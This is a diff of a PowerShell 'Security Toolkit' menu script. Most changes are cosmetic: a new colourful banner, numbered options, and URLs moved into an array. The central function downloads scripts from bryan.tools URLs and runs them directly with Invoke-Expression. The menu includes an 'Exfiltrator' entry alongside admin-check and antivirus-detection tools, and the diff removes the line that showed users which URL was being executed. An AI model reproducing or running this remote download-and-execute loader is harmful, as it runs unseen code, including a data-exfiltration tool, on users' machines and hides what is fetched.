@@ -1,16 +1,35 @@
 function Show-AsciiArt {
     $ascii = @"
-    ╔══════════════════════════════════════╗
-    ║     ███████╗███████╗ ██████╗         ║
-    ║     ██╔════╝██╔════╝██╔════╝         ║
-    ║     ███████╗█████╗  ██║              ║
-    ║     ╚════██║██╔══╝  ██║              ║
-    ║     ███████║███████╗╚██████╗         ║
-    ║     ╚══════╝╚══════╝ ╚═════╝         ║
-    ║        Security Toolkit v1.0          ║
-    ╚══════════════════════════════════════╝
+    ╔════════════════════════════════════════════════╗
+    ║  ██████╗ ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗  ║
+    ║  ██╔══██╗██╔══██╗╚██╗ ██╔╝██╔══██╗████╗  ██║  ║
+    ║  ██████╔╝██████╔╝ ╚████╔╝ ███████║██╔██╗ ██║  ║
+    ║  ██╔══██╗██╔══██╗  ╚██╔╝  ██╔══██║██║╚██╗██║  ║
+    ║  ██████╔╝██║  ██║   ██║   ██║  ██║██║ ╚████║  ║
+    ║  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝  ║
+    ║                                                 ║
+    ║  ████████╗ ██████╗  ██████╗ ██╗     ███████╗  ║
+    ║  ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝  ║
+    ║     ██║   ██║   ██║██║   ██║██║     ███████╗  ║
+    ║     ██║   ██║   ██║██║   ██║██║     ╚════██║  ║
+    ║     ██║   ╚██████╔╝╚██████╔╝███████╗███████║  ║
+    ║     ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝  ║
+    ║                                                 ║
+    ║          Security Toolkit v1.0                 ║
+    ╚════════════════════════════════════════════════╝
 "@
-    Write-Host $ascii -ForegroundColor Cyan
+    $colors = @('Red', 'Yellow', 'Green', 'Cyan', 'Blue', 'Magenta')
+    $lines = $ascii -split "`n"
+    
+    for ($i = 0; $i -lt $lines.Count; $i++) {
+        $color = $colors[$i % $colors.Count]
+        # Keep the last line (Security Toolkit) in white
+        if ($i -eq $lines.Count - 2) {
+            Write-Host $lines[$i] -ForegroundColor White
+        } else {
+            Write-Host $lines[$i] -ForegroundColor $color
+        }
+    }
 }
 
 function Show-LoadingAnimation {
@@ -27,23 +46,23 @@ function Show-Menu {
         [int]$SelectedIndex = 0
     )
     $options = @(
-        "What is my IP?  [bryan.tool/Whatismtip]",
-        "Am I admin?     [bryan.tools/amiadmin]",
-        "AV Detect       [bryan.tools/detect]",
-        "Exfiltrator     [bryan.tools/exfil]",
-        "Reporter        [bryan.tools/report]",
+        "What is my IP?",
+        "Am I admin?",
+        "AV Detect",
+        "Exfiltrator",
+        "Reporter",
         "Exit"
     )
 
     Clear-Host
     Show-AsciiArt
-    Write-Host "`nUse ↑/↓ arrows to navigate, Enter to select`n" -ForegroundColor Yellow
+    Write-Host "`nUse ↑/↓ arrows or numbers (1-6) to select, Enter to execute`n" -ForegroundColor Yellow
 
     for ($i = 0; $i -lt $options.Count; $i++) {
         if ($i -eq $SelectedIndex) {
-            Write-Host "→ $($options[$i])" -ForegroundColor Green
+            Write-Host "→ [$($i + 1)] $($options[$i])" -ForegroundColor Green
         } else {
-            Write-Host "  $($options[$i])" -ForegroundColor Gray
+            Write-Host "  [$($i + 1)] $($options[$i])" -ForegroundColor Gray
         }
     }
 }
@@ -52,7 +71,7 @@ function Invoke-Tool {
     param (
         [string]$Url
     )
-    Write-Host "`nExecuting script from $Url..." -ForegroundColor Yellow
+    Write-Host "`nExecuting script..." -ForegroundColor Yellow
     try {
         $result = Invoke-RestMethod -Uri $Url
         Invoke-Expression $result
@@ -65,12 +84,32 @@ function Invoke-Tool {
 
 # Main menu loop
 $selectedIndex = 0
+$urls = @(
+    "bryan.tool/Whatismtip",
+    "bryan.tools/amiadmin",
+    "bryan.tools/detect",
+    "bryan.tools/exfil",
+    "bryan.tools/report"
+)
+
 Show-LoadingAnimation
 
 while ($true) {
     Show-Menu -SelectedIndex $selectedIndex
     
     $key = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
+    
+    # Handle number keys (1-6)
+    if ($key.KeyChar -ge '1' -and $key.KeyChar -le '6') {
+        $selectedIndex = [int]($key.KeyChar - '1')
+        if ($selectedIndex -eq 5) {
+            Clear-Host
+            Write-Host "Goodbye!" -ForegroundColor Cyan
+            return
+        }
+        Invoke-Tool -Url $urls[$selectedIndex]
+        continue
+    }
     
     switch ($key.VirtualKeyCode) {
         38 { # Up arrow
@@ -80,18 +119,12 @@ while ($true) {
             if ($selectedIndex -lt 5) { $selectedIndex++ }
         }
         13 { # Enter
-            switch ($selectedIndex) {
-                0 { Invoke-Tool -Url "bryan.tool/Whatismtip" }
-                1 { Invoke-Tool -Url "bryan.tools/amiadmin" }
-                2 { Invoke-Tool -Url "bryan.tools/detect" }
-                3 { Invoke-Tool -Url "bryan.tools/exfil" }
-                4 { Invoke-Tool -Url "bryan.tools/report" }
-                5 { 
-                    Clear-Host
-                    Write-Host "Goodbye!" -ForegroundColor Cyan
-                    return
-                }
+            if ($selectedIndex -eq 5) {
+                Clear-Host
+                Write-Host "Goodbye!" -ForegroundColor Cyan
+                return
             }
+            Invoke-Tool -Url $urls[$selectedIndex]
         }
     }
 }
